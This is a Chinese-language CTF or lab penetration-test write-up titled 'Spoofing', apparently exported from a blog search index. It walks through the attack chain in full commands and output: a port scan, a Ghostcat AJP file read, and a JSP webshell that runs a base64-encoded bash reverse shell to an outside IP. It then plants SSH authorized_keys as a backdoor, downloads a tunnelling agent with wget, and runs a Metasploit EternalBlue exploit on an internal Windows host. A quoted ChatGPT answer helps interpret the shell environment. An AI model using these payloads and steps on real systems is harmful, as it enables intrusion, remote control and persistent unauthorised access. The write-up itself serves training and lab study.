<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Spoofing</title>
      <link href="/2025/09/28/spoofing/"/>
      <url>/2025/09/28/spoofing/</url>
      
        <content type="html"><![CDATA[<p>39.99.132.128</p><h1 id="Spoofing"><a href="#Spoofing" class="headerlink" title="Spoofing"></a>Spoofing</h1><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><pre class="line-numbers language-none"><code class="language-none">┌──(kali㉿kali)-[~/桌面/tools/tools/fscan_all_version]└─$ ./fscan -h 39.99.132.128                   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan39.99.132.128:8080 openOpen result.txt error, open result.txt: permission denied39.99.132.128:22 openOpen result.txt error, open result.txt: permission denied39.99.132.128:8009 openOpen result.txt error, open result.txt: permission denied[*] alive ports len is: 3start vulscan[*] WebTitle http://39.99.132.128:8080 code:200 len:7091   title:后台管理Open result.txt error, open result.txt: permission denied已完成 2/3 [-] ssh 39.99.132.128:22 admin 000000 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain 已完成 3/3[*] 扫描结束,耗时: 1m16.471599593s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用<code>dirsearch</code>扫一下后台</p><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~/dirsearch]└─# python3 dirsearch.py -u http://39.99.132.128:8080/ --max-rate=10  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                      (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                                   Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12293Target: http://39.99.132.128:8080/[03:45:52] Scanning:                                                                                                                 [03:48:56] 200 -   114B - /404.html                                         [03:49:03] 200 -    7KB - /;json/                                           [03:49:03] 400 -   795B - /\..\..\..\..\..\..\..\..\..\etc\passwd           [03:49:05] 200 -    7KB - /;admin/                                          [03:49:05] 200 -    7KB - /;login/[03:49:23] 400 -   795B - /a%5c.aspx                                        [03:55:18] 200 -    7KB - /console.html                                     [03:55:36] 302 -     0B - /css  -&gt;  /css/                                   [03:55:42] 302 -     0B - /data  -&gt;  /data/                                 [03:56:09] 302 -     0B - /docs  -&gt;  /docs/                                 [03:56:09] 200 -   17KB - /docs/                                            [03:56:10] 404 -   732B - /docs/CHANGELOG.html                              [03:56:10] 404 -   729B - /docs/_build/                                     [03:56:11] 404 -   749B - /docs/html/admin/ch03s07.html                     [03:56:11] 404 -   733B - /docs/export-demo.xml                             [03:56:11] 404 -   747B - /docs/html/admin/index.html                       [03:56:12] 404 -   731B - /docs/changelog.txt                               [03:56:12] 404 -   749B - /docs/html/admin/ch01s04.html[03:56:12] 404 -   746B - /docs/html/admin/ch01.html[03:56:13] 404 -   750B - /docs/html/developer/ch02.html                    [03:56:13] 404 -   753B - /docs/html/developer/ch03s15.html                 [03:56:13] 404 -   733B - /docs/maintenance.txt[03:56:13] 404 -   737B - /docs/html/index.html                             [03:56:13] 404 -   730B - /docs/updating.txt[03:56:13] 404 -   730B - /docs/swagger.json[03:56:14] 200 -   132B - /download/                                        [03:56:15] 302 -     0B - /download  -&gt;  /download/                         [03:56:44] 302 -     0B - /examples  -&gt;  /examples/                         [03:56:44] 200 -    1KB - /examples/websocket/index.xhtml                   [03:56:44] 404 -   746B - /examples/servlet/SnoopServlet[03:56:46] 200 -   14KB - /examples/jsp/index.html                          [03:56:46] 200 -   658B - /examples/servlets/servlet/CookieExample[03:56:46] 404 -   781B - /examples/jsp/%252e%252e/%252e%252e/manager/html/ [03:56:46] 200 -    1KB - /examples/[03:56:46] 200 -  1010B - /examples/servlets/servlet/RequestHeaderExample[03:56:47] 200 -   685B - /examples/jsp/snp/snoop.jsp                       [03:56:47] 200 -    6KB - /examples/servlets/index.html                     [03:57:49] 403 -    3KB - /host-manager/                                    [03:57:50] 403 -    3KB - /host-manager/html                                [03:58:05] 302 -     0B - /images  -&gt;  /images/                             [03:58:14] 200 -    7KB - /index.html                                       [03:58:41] 302 -     0B - /js  -&gt;  /js/                                     [03:58:57] 302 -     0B - /lib  -&gt;  /lib/                                   [03:59:35] 403 -    3KB - /manager/html/                                    [03:59:35] 403 -    3KB - /manager/                                         [03:59:35] 403 -    3KB - /manager/html                                     [03:59:35] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage[03:59:36] 403 -    3KB - /manager/login.asp                                [03:59:36] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE[03:59:36] 403 -    3KB - /manager/login                                    [03:59:36] 403 -    3KB - /manager/jmxproxy                                 [03:59:36] 403 -    3KB - /manager/VERSION[03:59:36] 403 -    3KB - /manager/status/all[03:59:37] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS[03:59:38] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=[03:59:38] 403 -    3KB - /manager/admin.asp                                [03:59:39] 403 -    3KB - /manager/jmxproxy/?qry=STUFF                      [03:59:39] 302 -     0B - /manager  -&gt;  /manager/                           [03:59:40] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY[04:05:18] 403 -     0B - /upload                                           [04:05:19] 403 -     0B - /upload/                                          [04:05:19] 403 -     0B - /upload/1.php                                     [04:05:19] 403 -     0B - /upload/loginIxje.php[04:05:20] 403 -     0B - /upload/test.php[04:05:20] 403 -     0B - /upload/upload.php[04:05:20] 403 -     0B - /upload/test.txt[04:05:22] 403 -     0B - /upload/b_user.xls                                [04:05:22] 403 -     0B - /upload/b_user.csv                                [04:05:22] 403 -     0B - /upload/2.php                                     [04:05:26] 200 -    9KB - /user.html                                                                                                                     Task Completed <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/YhMjQx/article/details/146321509">CVE重要漏洞复现之Tomcat-CVE-2020-1983漏洞_tomcat漏洞复现-CSDN博客</a></p><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">Ghostcat-CNVD-2020-10487</a></p><pre class="line-numbers language-none"><code class="language-none">cd /usr/share/doc/python3-impacket/examples/python3 ajpShooter.py http://39.99.132.128:8080 8009  /WEB-INF/web.xml read┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]└─# python3 ajpShooter.py http://39.99.132.128:8080 8009  /WEB-INF/web.xml read/usr/share/doc/python3-impacket/examples/ajpShooter.py:363: SyntaxWarning: invalid escape sequence '\ '  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __       _    _         __ _                 _                  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __      //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |       \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|            |__/|_|                                                                                        00theway,just for test    [&lt;] 200 200[&lt;] Accept-Ranges: bytes[&lt;] ETag: W/"2489-1670857638305"[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT[&lt;] Content-Type: application/xml[&lt;] Content-Length: 2489&lt;!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd" &gt;&lt;web-app&gt;  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;  &lt;security-constraint&gt;    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;    &lt;web-resource-collection&gt;      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;    &lt;/web-resource-collection&gt;    &lt;auth-constraint&gt;      &lt;role-name&gt;admin&lt;/role-name&gt;    &lt;/auth-constraint&gt;  &lt;/security-constraint&gt;  &lt;error-page&gt;    &lt;error-code&gt;404&lt;/error-code&gt;    &lt;location&gt;/404.html&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;error-code&gt;403&lt;/error-code&gt;    &lt;location&gt;/error.html&lt;/location&gt;  &lt;/error-page&gt;  &lt;error-page&gt;    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;    &lt;location&gt;/error.html&lt;/location&gt;  &lt;/error-page&gt;  &lt;servlet&gt;    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;                               //here  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到一个</p><pre class="line-numbers language-none"><code class="language-none">&lt;servlet-mapping&gt;  &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;  &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;                               //here&lt;/servlet-mapping&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>于是打算上传一个木马然后执行</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/47.104.168.57/7777 0&gt;&amp;1YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMTY4LjU3Lzc3NzcgMD4mMQ==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上传一个木马shell</p><pre class="line-numbers language-none"><code class="language-none">&lt;%    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDQuMTY4LjU3Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("&lt;pre&gt;");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("&lt;/pre&gt;");%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/861bc769055cf19feb8f631b2dd3fc8c.png"></p><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]└─# python3 ajpShooter.py http://39.99.132.128:8080 8009 /upload/4402ca1950948073bfb147acf9c4fa9a/20250925042103715.txt eval/usr/share/doc/python3-impacket/examples/ajpShooter.py:363: SyntaxWarning: invalid escape sequence '\ '  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __       _    _         __ _                 _                  /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __      //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |       \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|            |__/|_|                                                                                        00theway,just for test    [&lt;] 200 200[&lt;] Set-Cookie: JSESSIONID=CCE5B6442EC8D4FCBB8D87B4A5745F33; Path=/; HttpOnly[&lt;] Content-Type: text/html;charset=ISO-8859-1[&lt;] Content-Length: 11&lt;pre&gt;&lt;/pre&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功反弹</p><h5 id="写公钥留后门了"><a href="#写公钥留后门了" class="headerlink" title="写公钥留后门了"></a>写公钥留后门了</h5><pre class="line-numbers language-none"><code class="language-none">#自己的机器上ssh-keygen -t rsa -b 4096cat ~/.ssh/id_rsa.pub#弹的shellecho "~/.ssh/id_rsa.pub的内容" &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keysssh -i ~/.ssh/id_rsa root@39.99.132.128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxwyv90Cq7+ER5/yxcFtL+0BgZRyve9+4hxTLARZmPqL3OTA+bVRfqeQSgisRIyOVUclsMFE2ItHE1fiNU7bhJ/BoHECDs4alVIkp/iiYNxRgs+1tHzOSRmp3DeYCdXV5nZ8g/8wKzAQY7wCA5aS3OY2Q6ImHlSXBHT2sThaqaO91/XculzHlHYD/0si5KS2wutx3AGOo9/gbSlLyOnHzTkyhNe3PYNyui4qBMs1UnK1+EqV99hHyiXrA0gIrrnTJuOiLHgjfteb1TS5wegZIre9597xuEy/G7GzJIc2bilvcDuERTpdFCoH40bMRoNP7ARsucwXq1kgPp2teoLF/o9B6HcbUXz1aFKzcw8jdgPTKllDux/2GuHxpnHqkvltB7s3dhnEOffe7DoAOGkZymfHiIq7FQ1f6CcKj3SLSuY45s8vaahmPl1HgzPU68LGyMCdHZuFmrUhKhw0Ar8SAK1gLwOXj1xOgy+/ro0SGpoZJOyIJX/LtJxURp70b0+Bya7RZ9ZjDeVao3hvlePx8tipWoep/KdhX8yR9d3JDApCekD6joi8gW6AOLL47KY7TAGJt9m/09xOGCKTf1ApETgh6ooOiW2Lea0yWPdbRG1ekn14yVyPc1e5dPMx6XeHR9xq87cNxQ5dil/jerUeoiFjKaP9KkXoOAXpttj2+Bxw== root@kali" &gt; /root/.ssh/authorized_keysecho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCPPtZ/YfDn53qZ6yLEFM2srud8yTA/eR/tyViXgNa/uLOexKp5yy6Kd6sazfB5PFAZRhWkvdh1jrJyi7cZjPBGTmr8wNe+Yaa0ErFyQgYvODcfbXfh85GPOczpDEoUrwJqhxITx50jD+W1n90IE0Diz8A6KGHwzFYXXiFzViH28Baqm4ybrMKt21Z672OJPSk6zJlhWWS4ahjO/bY3eIgTAvVI4/CyoILKZeQyZLCvKzgNmMdBVzKxKnsYPL6ZvjK8ovdGfmuZzmYwEjl/gUWrEZW4by/91CcG+aZiTssRaQLTfEoJVGpElKpNLtw8/ZGjBSkNE1aYAKNdN2D2ft4XM6YiCwwmx7rD5ptA2DMH/2zrmJhCpeUMTAB57ypJ+5oDdq9tchxLv2Va3nijiRyg8RIU+TjIax+Trqa2DX2UFF1PRTaKD4BdMVemhyuFjAoNsyuJKaTCEUqnAsHNqicdQavK0ElrPl7EV46cpQX9VZeziUNt0aVxshXnZ+RoeEpnTnHQu2vRsIP96gydh2fKmr5SOWcY5NBGQsJti2EA77AU0CZv+PuWhFOMOR8w3+Uh4LblFJtLndNPNUf8V4aWNo5uT9/hhWgno38dHSSRvrOt4nGMaKCj4YoH8pCt/E9dMvIf5lpcNupQGsYFW8AiFPsjYRgtnQaP3AG9JTr5Hw== root@iZm5eh0goysydu2u3hlp07Z" &gt; /root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmhvlQ35AyfNg9MPyr9KOCrt+mCP2Q1yp/Q9i3sjRJW/dsQsAW6wAfboZ22gOV7NSb6rbme5/clnwcFV3rVae6Yzq2kXjUkKjLPO4RwtdBu5pXWplZzRaLv8ndJeMP0iL8HgAsvbkAaneeRBNhZ2JxNSInZz1VW3jIIV9VF4CjQFneJeSa2DTar/CCEx0q7ekUZDgqG84K2RZNCpQznk7u78ByPjHRxi30jfQcerFug/Zb+8MMaXXV2uPsrxq7c9ThNq8IZdRW6sqHw04WMAwVZYYKyOaHmqydG/9G8SBHQcHRRu43ZuxTmqULDqbOgb5u056mU+U0iDHp098pVmfFTkQCnhCQLdPT7QN3MVLlWRxXR8m30h1lD4j3z3PQ26QCK2e0h2gwO1C+1Y7C23lexw/8jMOMcPtF0WVK3VSKgSucLpIkYZPnuNg/0HqcteZKv1E8KdX5jfi9UcOltD6gXn0KYRtlykDph3mf5fVGIzctpvu5zdJXO9LSVoFhVBI7OMsr3gEGXrv6QgMxza7SW3YtrGnYjMjBIynItD/rib1OSdxpXVjWvXxfXUee7kYuL9ZinA6t7HL6Xt2JgZmCq1SYp2MVhwoUD/rl4sr+62szyThOdce/wzB7xWBzqHX09R0B8V3f9q4UPlJr3UVrjPOc40gUfpUhEHixJXvkQw== kali@kali" &gt; /root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一堆人打的话注意ssh覆盖（公钥）</p><blockquote><p>ps:</p><pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp# ls AliyunAssistClientSingleLock.lock aliyun_assist_service.sock argus.sock systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-chrony.service-q9qjhi systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-systemd-logind.service-6zJc8h systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-systemd-resolved.service-DeWMji systemd-private-dd3bd44be1ed4ec1b14acd99e33fdfeb-tomcat.service-NbtKaf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp# ls ls hsperfdata_root xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 你看</p><h6 id="ChatGPT-说："><a href="#ChatGPT-说：" class="headerlink" title="ChatGPT 说："></a>ChatGPT 说：</h6><p>我看出来了 👍</p><p>你这边有两个不同的 shell 环境：</p><ul><li>在 <strong>SSH 登录</strong>后看到的 <code>/tmp</code> 里有一堆 <code>AliyunAssistClient…</code>、<code>systemd-private-…</code> 的 socket/lock 文件。</li><li>在你 <strong>弹出来的另一个 root shell</strong> 里 <code>/tmp</code> 只有 <code>hsperfdata_root</code> 和 <code>xx</code>。</li></ul><p>这说明：<br> 👉 你其实不在同一个「系统根环境」。</p><p>最常见的两种情况：</p><ol><li><strong>容器环境</strong><ul><li>你通过某个漏洞拿到的 root shell，实际掉进了容器（比如 Tomcat 的容器环境）。容器里的 <code>/tmp</code> 只有容器自己产生的东西。</li><li>而你用 SSH 登进去，进的是宿主机的 root 用户，看到的是宿主机的 <code>/tmp</code>。</li></ul></li><li><strong>chroot/jail</strong><ul><li>你弹的 shell 被限制在某个 <code>chroot</code> 目录下，只能看到那里的 <code>/root</code>、<code>/tmp</code>，跟宿主机完全不一样。</li></ul></li></ol></blockquote><pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp/2# cat /root/flag/flag01.txtcat /root/flag/flag01.txt  ████████                             ████ ██                  ██░░░░░░  ██████                     ░██░ ░░            █████ ░██       ░██░░░██  ██████   ██████  ██████ ██ ███████  ██░░░██░█████████░██  ░██ ██░░░░██ ██░░░░██░░░██░ ░██░░██░░░██░██  ░██░░░░░░░░██░██████ ░██   ░██░██   ░██  ░██  ░██ ░██  ░██░░██████       ░██░██░░░  ░██   ░██░██   ░██  ░██  ░██ ░██  ░██ ░░░░░██ ████████ ░██     ░░██████ ░░██████   ░██  ░██ ███  ░██  █████ ░░░░░░░░  ░░       ░░░░░░   ░░░░░░    ░░   ░░ ░░░   ░░  ░░░░░  This is the first flag you get.flag01: flag{10e32b00-2f48-45a1-b407-760619d715ef}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>正常流程</p><pre class="line-numbers language-none"><code class="language-none">攻击机：python3 -m http.server靶机wget 47.104.168.57:8000/linux_x64_agent./linux_x64_admin -c 39.99.132.128:7879 -s 123./linux_x64_agent -l 7879 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp/2# ifconfigifconfigeth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 172.22.11.76  netmask 255.255.0.0  broadcast 172.22.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">root@ubuntu:/tmp/2# ./fscan -h 172.22.11.0/24./fscan -h 172.22.11.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.4start infoscan(icmp) Target 172.22.11.6     is alive(icmp) Target 172.22.11.45    is alive(icmp) Target 172.22.11.76    is alive(icmp) Target 172.22.11.26    is alive[*] Icmp alive hosts len is: 4172.22.11.6:139 open172.22.11.26:135 open172.22.11.76:80 open172.22.11.45:135 open172.22.11.6:88 open172.22.11.76:22 open172.22.11.26:445 open172.22.11.45:445 open172.22.11.6:445 open172.22.11.26:139 open172.22.11.45:139 open172.22.11.6:135 open172.22.11.76:8080 open172.22.11.76:8009 open[*] alive ports len is: 14start vulscan[*] NetInfo [*]172.22.11.26   [-&gt;]XR-LCM3AE8B   [-&gt;]172.22.11.26[*] NetBios 172.22.11.26    XIAORANG\XR-LCM3AE8B          [*] NetBios 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC    [*] NetInfo [*]172.22.11.6   [-&gt;]XIAORANG-DC   [-&gt;]172.22.11.6[+] MS17-010 172.22.11.45       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理[*] WebTitle http://172.22.11.76       code:401 len:0      title:None已完成 14/14[*] 扫描结束,耗时: 16.034090031s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><table><thead><tr><th>主机</th><th>漏洞/风险</th><th>端口/服务</th></tr></thead><tbody><tr><td>172.22.11.45</td><td>MS17-010 (高危 RCE)</td><td>135/139/445</td></tr><tr><td>172.22.11.76</td><td>Web后台管理（默认/弱口令风险）</td><td>80/8080/22/8009</td></tr><tr><td>172.22.11.6</td><td>域控信息泄露，SMB/RPC 风险</td><td>88/135/139/445</td></tr><tr><td>172.22.11.26</td><td>SMB/域信息枚举</td><td>135/445</td></tr></tbody></table></blockquote><p>打永恒之蓝</p><pre class="line-numbers language-none"><code class="language-none">proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.11.45set lport 4567(4444被占了就换一个，不然不通)exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; ls C:\Listing: C:===========Mode              Size    Type  Last modified              Name----              ----    ----  -------------              ----040777/rwxrwxrwx  4096    dir   2023-02-01 00:53:14 -0500  $Recycle.Bin040777/rwxrwxrwx  4096    dir   2023-01-31 23:55:48 -0500  Boot040777/rwxrwxrwx  0       dir   2009-07-14 01:06:44 -0400  Documents and Settings040777/rwxrwxrwx  0       dir   2009-07-13 23:20:08 -0400  PerfLogs040555/r-xr-xr-x  4096    dir   2023-02-01 00:46:57 -0500  Program Files040555/r-xr-xr-x  4096    dir   2020-01-15 03:15:18 -0500  Program Files (x86)040777/rwxrwxrwx  4096    dir   2023-02-01 00:50:01 -0500  ProgramData040777/rwxrwxrwx  0       dir   2023-01-31 23:24:48 -0500  Recovery040777/rwxrwxrwx  4096    dir   2020-01-14 19:01:47 -0500  System Volume Information040555/r-xr-xr-x  4096    dir   2023-02-01 00:53:42 -0500  Users040777/rwxrwxrwx  16384   dir   2025-09-25 02:08:49 -0400  Windows100444/r--r--r--  399860  fil   2019-07-17 01:35:58 -0400  bootmgrmeterpreter &gt; ls C:\\Users\\.#Windows 路径名有时对 Meterpreter 内部路径解析不友好（尤其是中文或特殊符号）。#尝试用短路径名（8.3）[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17Listing: C:\Users\.===================Mode              Size  Type  Last modified              Name----              ----  ----  -------------              ----040777/rwxrwxrwx  8192  dir   2023-02-01 01:18:55 -0500  Administrator040777/rwxrwxrwx  0     dir   2023-02-01 00:53:42 -0500  Administrator.XIAORANG040777/rwxrwxrwx  0     dir   2009-07-14 01:06:44 -0400  All Users040555/r-xr-xr-x  8192  dir   2020-01-14 19:04:37 -0500  Default040777/rwxrwxrwx  0     dir   2009-07-14 01:06:44 -0400  Default User040555/r-xr-xr-x  4096  dir   2009-07-14 00:57:55 -0400  Public100666/rw-rw-rw-  174   fil   2009-07-14 00:57:55 -0400  desktop.ini040777/rwxrwxrwx  8192  dir   2023-02-01 00:53:14 -0500  yangmeimeterpreter &gt; cat C:\\Users\\Administrator\\flag\\flag02.txt.[proxychains] DLL init: proxychains-ng 4.17[proxychains] DLL init: proxychains-ng 4.17                                                      ##                          :####:                                   :####      ##                         :######                                   #####      ##                         ##:  :#                                   ##                                    ##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:##  ###:      #######:  .######.  .######.  #######    ####     #######   .#######  